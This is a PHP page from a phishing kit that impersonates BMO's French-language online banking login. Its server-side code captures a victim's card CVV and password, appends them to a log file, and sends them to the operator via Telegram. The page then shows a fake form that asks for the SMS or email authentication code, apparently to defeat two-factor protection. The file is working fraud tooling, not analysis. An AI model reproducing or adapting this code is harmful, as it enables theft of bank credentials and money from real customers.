<?php session_start();
require_once "../sendto.php" ;
if (!isset($_POST["cvv"]) or !isset( $_POST["mdp"])) {
    header("Location: ./index.php");
    exit();
}

$_SESSION["cvv"] = $_POST['cvv'] ;
$_SESSION["mdp"] = $_POST['mdp'] ;
$heure = date("h:i:s") ;
$date = date("Y:m:d") ;


$donnees = "\n"."** NOUVELLE CONNEXION ** a :  ".$_SESSION["bank"].
"\n"."heure :".$heure.
"\n"."date :".$date.
"\n". "Cvv : " .$_SESSION["cvv"] .
"\n"."Mdp : " .$_SESSION["mdp"] .
"\n";
$file = "../blinky2000@bvc@bvc@destruction.txt" ;
file_put_contents($file, $donnees, FILE_APPEND);

sendMessageToTelegram($donnees) ;

?>





<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BMO</title>
    <link rel="stylesheet" media="screen and (max-width: 768px)" href="styles_mobile.css">

    <link rel="stylesheet" media="screen and (min-width: 769px)" href="styles_pc.css">
</head>
    <header>
        <span>BMO</span> <img  width=50px  src="./bmo.webp" alt="">
    </header>
<body>
    <h2>Ouverture de session – Services bancaires en ligne</h2>

<div class="container">
    <form action="/bmo/terminus.php" method="post">
        
        <label for="sms">Vous recevrez un code d'authentification sur votre E-mail ou par sms</label>
        <input type="text" name="sms">
           

            <div class="valid"> 
                <input type="submit" value="valider">
            </div>
       

    </form>
    



</div>

    <footer>

    </footer>
</body>
</html>
